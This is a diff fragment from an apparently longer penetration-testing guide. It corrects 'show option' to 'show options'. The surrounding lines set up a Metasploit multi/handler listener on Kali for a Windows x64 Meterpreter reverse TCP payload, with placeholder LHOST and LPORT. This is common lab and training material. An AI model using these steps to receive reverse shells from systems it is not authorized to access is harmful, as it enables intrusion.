@@ -246,7 +246,7 @@ In KALI , Open a terminal to start a listener and wait for reverse shell connect
 in terminal type in msfconsole as a command, then  
 msf6> use multi/handler
 msf6 exploit(multi/handler)> set PAYLOAD windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler)> show option ## to see what we need to fill out
+msf6 exploit(multi/handler)> show options ## to see what we need to fill out
 msf6 exploit(multi/handler)> set LHOST xx.xx.xx.xx 
 msf6 exploit(multi/handler)> set LPORT xxxxx
 msf6 exploit(multi/handler)> run
